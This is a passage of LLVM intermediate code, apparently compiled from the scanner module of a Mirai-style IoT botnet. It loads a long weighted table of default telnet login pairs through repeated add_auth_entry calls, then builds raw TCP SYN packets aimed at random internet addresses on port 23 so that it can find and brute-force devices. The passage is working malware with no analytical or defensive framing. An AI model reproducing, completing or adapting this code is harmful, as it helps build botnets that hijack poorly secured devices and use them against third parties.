  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  store i16 %132, i16* %134, align 4
  %135 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -241
  %139 = or i16 %138, 80
  store i16 %139, i16* %136, align 4
  %140 = call i32 @rand_next()
  %141 = and i32 %140, 65535
  %142 = trunc i32 %141 to i16
  %143 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 5
  store i16 %142, i16* %144, align 2
  %145 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %146 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -513
  %149 = or i16 %148, 512
  store i16 %149, i16* %146, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.29, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.34, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i64 0, i64 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.41, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.42, i64 0, i64 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i64 0, i64 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.50, i64 0, i64 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.53, i64 0, i64 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i64 0, i64 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.59, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i64 0, i64 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.65, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.66, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.73, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i64 0, i64 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i64 0, i64 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.78, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.82, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i64 0, i64 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i64 0, i64 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i64 0, i64 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.92, i64 0, i64 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.94, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i64 0, i64 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i64 0, i64 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.97, i64 0, i64 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.98, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.99, i64 0, i64 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i64 0, i64 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i64 0, i64 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i64 0, i64 0), i16 zeroext 1)
  br label %150

150:                                              ; preds = %104, %1167
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %151 = load i32, i32* @fake_time, align 4
  %152 = load i32, i32* %13, align 4
  %153 = icmp ne i32 %151, %152
  br i1 %153, label %154, label %218

154:                                              ; preds = %150
  %155 = load i32, i32* @fake_time, align 4
  store i32 %155, i32* %13, align 4
  store i32 0, i32* %1, align 4
  br label %156

156:                                              ; preds = %214, %154
  %157 = load i32, i32* %1, align 4
  %158 = icmp slt i32 %157, 760
  br i1 %158, label %159, label %217

159:                                              ; preds = %156
  %160 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %160, i8 0, i64 16, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %18, align 8
  %161 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i64 1
  %163 = bitcast %struct.iphdr* %162 to %struct.tcphdr*
  store %struct.tcphdr* %163, %struct.tcphdr** %19, align 8
  %164 = call i32 @rand_next()
  %165 = trunc i32 %164 to i16
  %166 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i32, i32* @LOCAL_ADDR, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 8
  store i32 %168, i32* %170, align 4
  %171 = call i32 @get_random_ip()
  %172 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 7
  store i16 0, i16* %175, align 2
  %176 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %177 = bitcast %struct.iphdr* %176 to i16*
  %178 = call zeroext i16 @checksum_generic(i16* %177, i32 20)
  %179 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 7
  store i16 %178, i16* %180, align 2
  %181 = call zeroext i16 @htons(i16 zeroext 23) #11
  %182 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 1
  store i16 %181, i16* %183, align 2
  %184 = load %struct.iphdr*, %struct.iphdr** %18, align 8
